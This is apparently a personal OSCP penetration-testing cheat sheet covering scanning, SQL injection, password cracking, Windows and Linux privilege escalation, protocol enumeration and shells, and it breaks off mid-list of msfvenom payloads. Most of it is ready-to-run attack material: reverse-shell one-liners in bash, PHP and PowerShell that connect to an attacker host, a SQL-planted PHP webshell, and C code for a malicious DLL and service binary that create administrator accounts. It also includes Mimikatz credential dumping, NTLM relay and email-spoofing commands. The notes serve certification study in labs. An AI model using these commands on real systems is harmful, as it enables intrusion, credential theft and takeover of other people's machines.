### General OSCP

#### VPN

Connect to OffSec labs

```sh
sudo openvpn /home/kali/Documents/offsec/universal.ovpn 
```

#### SSH tip

The `UserKnownHostsFile=/dev/null` and `StrictHostKeyChecking=no` options have been added to prevent the known-hosts file on our local Kali machine from being corrupted.

```sh
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" USER@IP
```

#### RDP

```sh
xfreerdp3 /u:USER/p:PASS /v:IP /dynamic-resolution
rdesktop IP -u USER -p PASS
```

### Reconnaissance and Enumeration

``` sh
# Standard actions
sudo nmap -p- IP
sudo nmap -p PORTS -A IP
```

### Scanning

#### Netcat

```sh
# Netcat TCP ports 3388-3390, 1 second timeout, zero I/O (data)
nc -nvv -w 1 -z IP 3388-3390
# Netcat UDP ports 120-123, 1 second timeout, zero I/O (data)
nc -nv -u -z -w 1 IP 120-123
```

#### Nikto

HTTP(S) only.

```sh
nikto -h http://target.com
```

#### Nmap

```sh
# Scan all TCP ports, stealth and fast (no ACK)
sudo nmap -sU -sS -vv IP
# Discovery scan, greppable format
nmap -v -sn IP -oG ping-sweep.txt
grep Up ping-sweep.txt | cut -d " " -f 2
# TCP scan, top 20 ports, with OS version detection, script scanning, and traceroute
nmap -sT -A --top-ports=20 IP -oG top-port-sweep.txt
# OS fingerprinting (guess)
sudo nmap -O IP --osscan-guess
# Vulnerability scan
sudo nmap -sV -p 443 --script "vuln" 192.168.50.124
# Check scripts
ls /usr/share/nmap/scripts/ | grep TERM
```

#### Nuclei

```sh
nuclei -target https://example.com
```

#### PowerShell

```ps1
# PowerShell scanning (living off the land)
Test-NetConnection -Port 445 IP
# PowerShell scan first 1024 ports
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("IP", $_)) "TCP port $_ is open"} 2>$null
```

### Exploitation

#### Exploits

##### SearchSploit

[Exploit-DB](https://www.exploit-db.com/)

```sh
sudo apt update && sudo apt install exploitdb

# Search terms
searchsploit afd windows local
# Show complete path
searchsploit -p 39446
# Exclude
searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"
# Strict
searchsploit -s Apache Struts 2.0.0
# JSON output
searchsploit -j 55555 | json_pp
# Download
searchsploit -m windows/remote/48537.py
searchsploit -m 42031
```

##### Metasploit

``` sh
msfconsole
# Open HTML file with module information
info -d 
```

#### Command Injection

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md)

#### SQL Injection

##### Payloads

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md) 

##### sqlmap

```sh
# sqlmap
sqlmap -u http://IP/index.php?user=1 -p user
# sqlmap with saved POST request
sqlmap -r post.txt -p user 
# sqlmap with dump
sqlmap -u http://IP/index.php?user=1 -p user --dump
# sqlmap with shell
sqlmap -u http://IP/index.php?user=1 -p user --os-shell
```

#### Password Attacks

##### Brute Force

[https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)

[https://weakpass.com/](https://weakpass.com/)

[https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)

[https://cloud.google.com/blog/topics/threat-intelligence/net-ntlmv1-deprecation-rainbow-tables](https://cloud.google.com/blog/topics/threat-intelligence/net-ntlmv1-deprecation-rainbow-tables)

###### Wordlists

```sh
# Kali lists
# Passwords
/usr/share/wordlists/rockyou.txt
# Usernames
/usr/share/wordlists/dirb/others/names.txt 

# Generate wordlist with min/max 6 characters (lab***)
crunch 6 6 -t lab%%% > wordlist
```

###### Hydra & FFUF

```sh
# Hydra
# Attempt single user name with password list
hydra -l USER -P PASSLIST -s PORT PROTO://IP
# Attempt login on HTTP POST form
hydra -l USER -P PASSLIST IP http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
# HTTP get (basic auth)
hydra -L USERLIST -P PASSLIST IP http-get /path/to/login
# HTTP basic auth, no 10s wait, verbose, failure=401
hydra -I -V -l USER -P PASSLIST "http-get://IP/webdav:A=BASIC:F=401"
# RDP single task (throttled to limit errors)
hydra -l USER -P /usr/share/wordlists/rockyou.txt -s 3389 rdp://IP -t 1 -v
# SSH
hydra -l USER -P /usr/share/wordlists/rockyou.txt IP -t 4 ssh -V
# FTP (also check empty, username, and reversed username password)
hydra -l 'admin' -P SecLists/Passwords/Default-Credentials/default-passwords.txt ftp://192.168.105.46 -e nsr -V

# FFUF
# Use request saved with Burp (make sure to put in FUZZ)
# Contains autoalign, force HTTP, and proxy via Burp
ffuf -w /usr/share/wordlists/rockyou.txt -request flatpress_login -ac -x http://127.0.0.1:8080 -request-proto http
```

###### JohnTheRipper

``` sh
# Crack SSH private key, run with ruleset
john --wordlist=ssh.passwords --rules=sshRules ssh.hash
# Convert SSH hash
ssh2john id_rsa > ssh.hash 
```

##### Cracking

[https://hashcat.net/hashcat/](https://hashcat.net/hashcat/) (mainly GPU, also support CPU)

[https://hashcat.net/wiki/doku.php?id=example\_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) (hash modes and example hashes)

[https://hashcat.net/wiki/doku.php?id=rule\_based\_attack](https://hashcat.net/wiki/doku.php?id=rule_based_attack) (rule functions)

[https://www.openwall.com/john/](https://www.openwall.com/john/) (mainly CPU, also supports GPU)

###### Hashcat

```sh
# Check hash modes available
hashcat -h | grep -i "ssh"
# Benchmark mode
hashcat -b
# Brute force MD5
hashcat -m 0
# Use rules, debug mode 
hashcat -r demo.rule --stdout wordlist.txt
# Rule to append !, 1, and capitalize first letter en lowercase the rest
$! $1 c
# Included rules
ls -la /usr/share/hashcat/rules/
# Crack MD5 with ruleset
hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r rules.rule

# Identify hash type
hash-identifier
hashid

# KeePass example
# Find KeePass database file (Windows)
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

# Convert KeePass database file to hash (remove filename in file)
keepass2john Database.kdbx > keepass.hash
cat keepass.hash   
	$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e...
# Crack password
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force

# NTLM
# Get local users
Get-LocalUser
# Run Mimikatz in elevated PowerShell window
.\mimikatz.exe
# Enable SeDebugPrivilege for needed debug privs
privilege::debug
# Elevate to SYSTEM privs
token::elevate
# Option 1 (local user): extract NThashes from SAM
lsadump::sam
# Option 2 (domain user): extract NThashes from LSASS
sekurlsa::logonpasswords
# Crack NThash with Hashcat, with best66 rules
hashcat -m 1000 HASHFILE /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force
```

### Privilege Escalation

#### Linux

[HackTricks](https://hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html) 
[compendium by g0tmi1k](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
[PayloadsAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/)

##### Enumeration

```sh
# Basics
id
whoami
hostname
uname -a
arch
cat /etc/os-release
groups
env
set
ps aux | cat
ls -la /home

# Enumerate packages and kernel modules for vulnerabilities
dpkg -l
lsmod
/sbin/modinfo <BINARY>

# Enumerate network configuration
# Check interfaces
ip addr
# Check routes
ip route
route
routel
# Check listening ports
netstat -tulnp

# Enumerate users
cat /etc/passwd
cat /etc/shadow

# Enumerate cronjobs
cat /etc/crontab
crontab -l
sudo crontab -l
ls -la /etc/cron*
grep -i "CRON" /var/log/syslog

# Display (other user) processes running in Linux with pspy
# https://github.com/dominicbreuker/pspy
python3 -m http.server 80
wget http://IP/pspy32s
./pspy32s
# Look for cmdline processes
cat /proc/self/cmdline 

# Check SSH config
# Check for: PermitRootLogin yes
# Check for: (#)PasswordAuthentication yes
cat /etc/ssh/sshd_config

# SUID / GUID
find / -perm -u=s -type f 2>/dev/null | grep -v "/snap"
find / -perm -g=s -type f 2>/dev/null | grep -v "/snap"

# Find all writable files/folders
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
find / -writable -type d 2>/dev/null
ls -la /etc/passwd
ls -la /etc/shadow
ls -la /etc/sudoers

# Find sensitive files
grep --color=auto -rnw '.' -ie "PASSWORD" --color=always 2> /dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;

# Look for commands in sudoers file
sudo -l

# Check sudo version
sudo -V

# Pivot to other user
su USER

# Check capabilities
# https://hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html
getcap -r / 2>/dev/null

# Check services
systemctl list-units
systemctl status SERVICE
/etc/systemd/system/SERVICE.service

# Find mounted drives
mount
cat /etc/fstab
# Find available disks for mounting
lsblk

# Files in temporary directories
ls -la /tmp
ls -la /var/tmp
ls -la /dev/shm

# Find emails
ls -la /var/mail

# Run LinPEAS
# https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
python3 -m http.server 80
wget http://LOCALIP/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh -a > /dev/shm/linpeas.txt 
less -r /dev/shm/linpeas.txt
# Run LinuxSmartEnumeration
python3 -m http.server 80
wget http://LOCALIP/lse.sh
chmod +x lse.sh
./lse.sh -l1
```

##### SUID/GUID

Find binaries with SUID/GUID bit set. Use [GTFOBins](https://gtfobins.org/) to further exploit. Note that some binaries need to be run with `sudo` and therefore require the password of the local user.

``` sh
# SUID
find / -perm -u=s -type f 2>/dev/null | grep -v "/snap"
# GUID
find / -perm -g=s -type f 2>/dev/null | grep -v "/snap"
```

#### Windows

##### Enumeration

``` ps1
# Username and hostname
whoami
# Privileges
whoami /priv
# Groups user is member of
whoami /groups
# Other users
net user
Get-LocalUser
net user USERNAME
# Other groups
net localgroup
Get-LocalGroup
# Group members
Get-LocalGroupMember GROUPNAME

# System info
systeminfo
# Always look in any specific service folders related to the challenge
../*config*
../*users*
etc
# Network info
ipconfig /all
route print
netstat -ano
# Installed apps (32/64 bit)
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
C:\Program Files
C:\Program Files (x86)
C:\Users\*\Downloads
# Processes
Get-Process

# Interesting files / folders
# Keepass DBs
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
# XAMMP config files
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
# Home directory documents
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

# PowerShell
# User command history
Get-History
(Get-PSReadlineOption).HistorySavePath
# Create WinRM session
evil-winrm -i IP -u USER -p "PASS"

# WinPEAS
# Serve winPEAS from home directory and download
cp /usr/share/peass/winpeas/winPEASx64.exe .
python3 -m http.server 80
iwr -uri http://IP/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe
```

##### Execute as other user

``` sh
# Run cmd as other user (need password)
runas /user:USER cmd
```

##### Windows Services

``` ps1
# List services
services.msc (GUI)
Get-Service
Get-CimInstance
# Example
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
wmic service get name,startname

# Enumerate binary permissions, look for write 
icacls "PATH_TO_BINARY"
Get-ACL

# Replace binary with custom one (see code below)
# Compile for 64-bit 
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
# Download and replace service on victim; example
iwr -uri http://192.168.48.3/adduser.exe -Outfile adduser.exe
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe

# Restart service (needs permissions)
net stop SERVICENAME
# In case of lacking permissions, check if it autostarts at boot
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'SERVICENAME'}
# In case of autostart, check if we have SeShutdownPrivilege
whoami /priv
# Reboot
shutdown /r /t 0
# Check user is in admin group after reboot
Get-LocalGroupMember administrators
```

##### DLL Hijacking

``` ps1
# Standard DLL search order (safe mode)
# When safe DLL search mode is disabled, the current directory is searched at position 2 after the application's directory.
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.

# Abuse missing DLL (Filezilla example)
# Enumerate installed apps
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
# Find DLL hijack vulnerability for : https://nvd.nist.gov/vuln/detail/CVE-2023-53959
# Check if we have write permissions in app directory
echo "test" > 'C:\FileZilla\FileZilla FTP Client\test.txt'
type 'C:\FileZilla\FileZilla FTP Client\test.txt'
# Leverage Procmon to see loaded DLLs
C:\tools\Procmon\Procmon64.exe
# Filter for process (filezilla.exe) and clear events
# Run app
# Look for CreateFile operations (also includes accessing existing files)
# Create malicious DLL to replace original one with (see code below)
x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
# Download and replace
iwr -uri http://192.168.48.3/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
# Execute app with right privileges (can be other user)
```

##### Unquoted Service Paths

``` ps1
# Enumerate installed apps
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
# Alternative (cmd.exe)
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """

# Check start/stop permissions
Start-Service GammaService
Stop-Service GammaService

# Check folder permissions of subpaths (example)
icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\Enterprise Apps"

# Replace with malicious binary
copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'

# Start service and check if creating new user worked
Start-Service GammaService
net user
net localgroup administrators
```

##### Scheduled Tasks

``` ps1
# List scheduled tasks
# Seek interesting information in the Author, TaskName, Task To Run, Run As User, and Next Run Time fields
schtasks /query /fo LIST /v 
Get-ScheduledTask

# Check user permissions on scheduled task binary (example)
icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe

# Replace with malicious binary
iwr -Uri http://192.168.48.3/adduser.exe -Outfile BackendCacheCleanup.exe
move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
move .\BackendCacheCleanup.exe .\Pictures\
# Check if it worked
net user
net localgroup administrators


# Create scheduled task to be executed as Administrator
$pw = ConvertTo-SecureString "ADMIN_PASS" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)
Invoke-Command -Computer COMP_NAME -ScriptBlock { schtasks /create /sc onstart /tn shell /tr TO_EXECUTE /ru SYSTEM } -Credential $creds
Invoke-Command -Computer COMP_NAME -ScriptBlock { schtasks /run /tn shell } -Credential $creds
```

##### SeImpersonatePrivilege

``` ps1
# GodPotato
# Check privilege
whoami /priv
# Check .NET version
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
# Download GodPotato
certutil -urlcache -split -f http://192.168.45.235/GodPotato-NET4.exe
# Test GodPotato
.\GodPotato-NET4.exe -cmd "whoami"
# Get netcat for reverse shell
certutil -urlcache -split -f http://192.168.45.235/nc.exe
.\GodPotato-NET4.exe -cmd "nc.exe 192.168.45.235 4444 -e cmd"

# PrintSpoofer (alternative)
iwr -uri http://IP/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
PrintSpoofer64.exe -i -c "cmd /c cmd.exe"
```

##### Code Samples

``` c
// Code to replace service binary with
// adduser.c
// The following C code will create a user named dave2 and add that user to the local Administrators group using the system function.

#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

``` c
// Malicious DLL example

#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave3 password123! /add");
  	    i = system ("net localgroup administrators dave3 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

##### File Upload Tools

Various ways to upload files to a Windows host.

``` sh
# Identify tools available
where curl
where wget
where certutil
where bitsadmin
where powershell
where python
where ftp

# Writable directory candidates
C:\Temp
C:\Windows\Temp
C:\ProgramData
C:\Users\Public
%APPDATA%
# Check write access
echo test > C:\Temp\test.txt

# HTTP
# Server
python3 -m http.server 80
# Client (PowerShell)
iwr http://IP/file.exe -OutFile C:\Temp\file.exe

# certutil (cmd only, no PS)
certutil -urlcache -split -f http://IP/file.exe C:\Temp\file.exe

# Curl (Win 10 1803+)
curl http://IP/file.exe -o C:\Temp\file.exe

# Bitsadmin
bitsadmin /transfer job http://IP/file.exe C:\Temp\file.exe

# FTP
ftp IP
put FILE

# SMB
# Server
impacket-smbserver share $(pwd) -smb2support
# Client
copy \\IP\share\file.exe C:\Temp\file.exe
# or map
net use Z: \\IP\share
Z:\file.exe
```

### Protocols

Additional information per protocol.

#### SSH (TCP: 22)

```sh
# Connect with specific SSH key only, without trying additional keys available on the system
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -o 'IdentitiesOnly=yes' -i /path/to/key USER@IP
```

#### SMTP (TCP: 25)

[https://hackviser.com/tactics/pentesting/services/smtp#connect](https://hackviser.com/tactics/pentesting/services/smtp#connect) 

##### Netcat
Connect to SMTP server via netcat and verify users/email addresses:

```sh
nc -nv IP 25
VRFY root
VRFY idontexist
```

##### PowerShell

```ps1
Test-NetConnection -Port 25 IP
# Telnet (install)
dism /online /Enable-Feature /FeatureName:TelnetClient
telnet IP 25
```

##### Nmap

``` sh
sudo nmap -p 25,587 --script smtp-* target.com
```

##### smtp-user-enum

``` sh
# SMTP user enumeration via VRFY, EXPN and RCPT with clever timeout, retry and reconnect functional
smtp-user-enum -U /usr/share/wordlists/metasploit/unix_users.txt -M VRFY -t IP
smtp-user-enum -U /usr/share/wordlists/metasploit/unix_users.txt -M RCPT -t IP
smtp-user-enum -U /usr/share/wordlists/metasploit/unix_users.txt -M EXPN -t IP
```

##### Swaks

```sh
# Basic SMTP connectivity test
swaks --to user@target.com --server target.com

# Specify SMTP port
swaks --to user@target.com --server target.com --port 25
swaks --to user@target.com --server target.com --port 587
swaks --to user@target.com --server target.com --port 465 --tls-on-connect

# Enumerate users via RCPT TO
swaks --to test@target.com --server target.com --quit-after RCPT

# Manual MAIL FROM / RCPT TO control
swaks --server target.com --mail-from attacker@evil.com --to victim@target.com

# Test SMTP AUTH (LOGIN)
swaks --to user@target.com --server target.com --auth LOGIN --auth-user user --auth-password pass

# Test SMTP AUTH (PLAIN)
swaks --to user@target.com --server target.com --auth PLAIN --auth-user user --auth-password pass

# Spoof sender address
swaks --to victim@target.com --from ceo@target.com --server target.com

# Custom email body
swaks --to victim@target.com --from attacker@evil.com --server target.com --data "Subject: Test\n\nBody text"

# Attach local file (also try with @ in front of filename)
swaks --to victim@target.com --server target.com --attach file.txt
swaks --to victim@target.com --server target.com --attach @file.txt

# Suppress data send (banner / capability recon)
swaks --server target.com --quit-after EHLO

# Test open relay
swaks --to victim@external.com --from spoof@external.com --server target.com

# Timeout control (avoid hanging)
swaks --to user@target.com --server target.com --timeout 5

```

#### WHOIS (TCP: 43)

```sh
whois DOMAIN
whois IP
```

#### DNS (TCP: 53)

##### Lookup

```sh
# Linux
host DOMAIN
host -t txt DOMAIN
# Windows
nslookup DOMAIN
nslookup -type=TXT DOMAIN IP
```

##### Zone transfer

```sh
# Attempt a Zone Transfer manually 
host -l DOMAIN ns1.DOMAIN
# Automated Zone Transfer check with DNSRecon
dnsrecon -d DOMAIN -t axfr
# Find SRV records (often points to AD Domain Controllers/SIP/LDAP)
host -t SRV _ldap._tcp.DOMAIN
```

#### HTTP(S) (TCP: 80, 443)

##### Enumeration

```sh
http://domain/robots.txt
http://domain/sitemap.xml
CTRL+U (page source)
Wappalyzer
DevTools Debugger
```

##### Interaction with CLI clients

Different methods to connect to HTTP(S) services via CLI.

```sh
curl --path-as-is -vv -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'
curl --data-urlencode
wget
httpx <URL> --download file.txt
```

##### Directories

###### Gobuster

```sh
gobuster dir -u IP -w /usr/share/wordlists/dirb/small.txt -t 10
```

###### Feroxbuster

```sh
feroxbuster -u http://target.com

# Scan with custom wordlist and extensions (PHP/ASP/JS common for OSCP)
feroxbuster -u http://target.com -w wordlist.txt -x php,asp,aspx,js,txt,pdf
```

###### FFUF

``` sh
ffuf -recursion -c -e '.htm','.php','.html','.js','.txt','.zip','.bak','.asp','.aspx','.xml' -w SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://domain.com/FUZZ
```

##### Subdomains

###### Manual

```sh
# Look for subdomains using wordlist
for ip in $(cat list.txt); do host $ip.DOMAIN; done
# Look for subdomains using PTR records (reverse DNS)
for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found"
```

###### DNSRecon

```sh
# Standard scan
dnsrecon -d DOMAIN -t std
# Brute force with wordlist
dnsrecon -d DOMAIN -D ~/list.txt -t brt
```

###### DNSEnum

```sh
dnsenum DOMAIN
```

###### Gobuster

Can create tailored wordlist using LLM or use SecLists.

```sh
gobuster dns -d DOMAIN -w wordlist.txt -t 10
```

###### CRT.sh

[crt.sh](https://crt.sh)

#### SMB (TCP: 139, 445)

##### PowerShell

```sh
net view \\dc01 /all
```

##### Nmap

```sh
# SMB + NetBIOS
sudo nmap -v -p 139,445 IP
sudo nmap -v -p 139,445 --script smb-os-discovery IP
# Enumeration scripts
sudo nmap -p 445 --script=smb-enum-shares,smb-enum-users,smb-enum-groups,smb-enum-domains,smb-security-mode IP

```

##### nbtscan

Query the NetBIOS name service for valid NetBIOS names, specifying the originating UDP port as 137 with the -r option. NetBIOS names are often very descriptive about the role of the host within the organization.

```sh
sudo nbtscan -r IP/24
```

##### enum4linux

https://hackviser.com/tactics/tools/enum4linux

```sh
enum4linux -a IP
```

##### smbmap

```sh
# Enumerate shares
smbmap -H IP
```

##### netexec

```sh
# Validate if credentials work
netexec smb IP -u 'USER' -p 'PASSSWORD'
```

##### smbclient

```sh
# List available SMB shares anonymously
smbclient -L 10.0.0.5 -N

# List shares with credentials
smbclient -L 10.0.0.5 -U user%password

# Connect to a share anonymously
smbclient //10.0.0.5/public -N

# Connect to a share with credentials
smbclient //10.0.0.5/share -U user%password

# Connect using a domain-qualified user
smbclient //10.0.0.5/share -U DOMAIN\\user%password

# Specify SMB version (common in CTFs)
smbclient //10.0.0.5/share -U user%password -m SMB2

# Non-interactive directory listing
smbclient //10.0.0.5/share -U user%password -c "ls"

# Download a single file
smbclient //10.0.0.5/share -U user%password -c "get flag.txt"

# Recursively download all files
smbclient //10.0.0.5/share -U user%password -c "recurse; prompt off; mget *"

# Upload a file
smbclient //10.0.0.5/share -U user%password -c "put shell.php"

# Check write permissions quickly
smbclient //10.0.0.5/share -U user%password -c "mkdir testdir"

# Use a credentials file
smbclient //10.0.0.5/share -A creds.txt

# Null session check against IPC$
smbclient //10.0.0.5/IPC$ -N

# Pass NTLM hash
smbclient \\\\192.168.50.212\\secrets -U USER --pw-nt-hash HASH

# Download all files in SMB share
mask ""
recurse ON
prompt OFF
mget *
```

##### Impacket

```sh
# Obtain interactive shell via SMB share using PsExec by passing hash (system privs) 
impacket-psexec -hashes 00000000000000000000000000000000:HASH USER@IP

# Obtain interactive shell via SMB share using WmiExec by passing hash (administrator privs)
impacket-wmiexec -hashes 00000000000000000000000000000000:HASH USER@IP

# Relay Net-NTLMv2 hash (no HTTP server, support SMB2), replace PS base64 content, open listener for reverse shell
impacket-ntlmrelayx --no-http-server -smb2support -t IP -c "powershell -enc PS_REVSHELL_ONELINER_BASE64"
nc -nvlp 8080
# Open bind shell and run SMB connection to Kali (example)
nc IP PORT
dir \\KALI_IP\test
```

##### Responder

[https://github.com/lgandx/Responder](https://github.com/lgandx/Responder)

```sh
# Receive and crack Net-NTLMv2 hash from target using Responder
# Display adapters
ip a
# Run Responder on adapter
sudo responder -I tap0
# From target machine, run simple dir listing to Responder
dir \\IP\test
# Crack captured Net-NTLMv2 hash with hashcat
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
```

#### SNMP (UDP: 161)

##### Nmap

```sh
# Scan for open ports
sudo nmap -sU --open -p IP -oG open-snmp.txt
```

##### onesixtyone

SNMP brute force scanner.

```sh
echo public > community
echo private >> community
echo manager >> community
for ip in $(seq 1 254); do echo 192.168.0.$ip; done > ips
onesixtyone -c community -i ips
```

##### snmpwalk

```sh
# With hex decode, timeout 10 sec
snmpwalk -c public -v1 -t 10 IP -Oa

# Enumerate Windows users on dc
snmpwalk -c public -v1 IP 1.3.6.1.4.1.77.1.2.25

# Enumerate running processes
snmpwalk -c public -v1 IP 1.3.6.1.2.1.25.4.2.1.2
sudo nmap -sU -p 161 --script=snmp-processes <target>

# Enumerate installed software
snmpwalk -c public -v1 IP 1.3.6.1.2.1.25.6.3.1.2

# Enumerate TCP listening ports
snmpwalk -c public -v1 IP 1.3.6.1.2.1.6.13.1.3
```

#### LDAP (TCP: 389/636)

##### Nmap

```sh
nmap -n -sV --script "ldap* and not brute" IP
```

##### ldapsearch

```sh
ldapsearch -H ldap://IP -x -b "DC=DOMAINPREFIX,DC=DOMAINSUFFIX" 
```

##### ldapdomaindump

```sh
ldapdomaindump IP -u 'DOMAIN\USER' -p 'PASSWORD'
```

##### netexec

``` sh
# Read LAPS password
netexec ldap IP -u 'USER' -p 'PASSWORD' -M laps
# Confirm credential
netexec ldap IP -u Administrator -p 'PASSWORD'
```

#### Squid Proxy (TCP: 3128)

##### Services

``` sh
# Find open ports on proxy itself
# Spose
python spose.py --proxy http://IP:3128 --target IP -allports
# Nmap (results not always consistent with other tools)
nmap -Pn -sV -p 3128 --script http-open-proxy IP
# When connecting to service, don't use localhost, use 127.0.0.1
```

##### Proxying

``` sh
# In browser, use FoxyProxy
# In CLI, use Proxychains and/or curl
curl --proxy http://IP:3128 http://IP:PORT
proxychains TOOL_WITH_PARAMETERS
```

#### WinRM (TCP: 5985/5986)

```sh
# Remote login
evil-winrm -i IP -u 'USER' -p 'PASSWORD' 
# Remote login with hash
evil-winrm -i IP -u 'USER' -H 'NTHASH'
```

#### Databases

##### MSSQL (TCP: 1433)

```sh
# MSSQL login
impacket-mssqlclient USER:PASS@IP -windows-auth

# Check version
SELECT @@version;
# List DBs. Defaults are: master, tempdb, model, and msdb
SELECT name FROM sys.databases;
# List tables in DB
SELECT * FROM offsec.information_schema.tables;
```

##### MySQL (TCP: 3306)

```sh
# MySQL login
mysql -u USER -p'PASS' -h IP -P PORT --skip-ssl-verify-server-cert

# Check version
select version();
# Current user
select system_user();
# List DBs
show databases;
# List tables in DB
show tables from DBNAME;
```

##### PostgreSQL (TCP: 5432)

```sh
# PostgreSQL login
psql -h IP -p PORT -U USER

# List DBs
\l
# Connect to DB
\c DB_NAME
# List tables in DB
select * from DB_NAME;
```


### Web and Reverse Shells

[https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary)
[Linux and Windows PHP shell](https://github.com/ivan-sincek/php-reverse-shell/)

[https://www.revshells.com/](https://www.revshells.com/)

```sh
# Check current shell
ps -p $$
echo %COMSPEC%

# Kali directory webshells
/usr/share/webshells/

# Create webshell using SQL (e.g. in phpmyadmin)
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\<FOLDERPATH>\\shell.php"

# Bash
bash -i >& /dev/tcp/IP/PORT 0>&1
# Bash (URL encoded)
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
# Bash, in case of sh
bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"
# PHP
php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh <&3 >&3 2>&3");'
# Powershell one liner
# https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3 
# in base of Base64, make sure to encode as UTF16 first
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# Python file hosting
python3 -m http.server 80

# Create payloads with msfvenom
# .exe 64-bit, stageless
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > reverse.exe
# .exe 32-bit, stageless
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > reverse.exe
# .elf, stageless
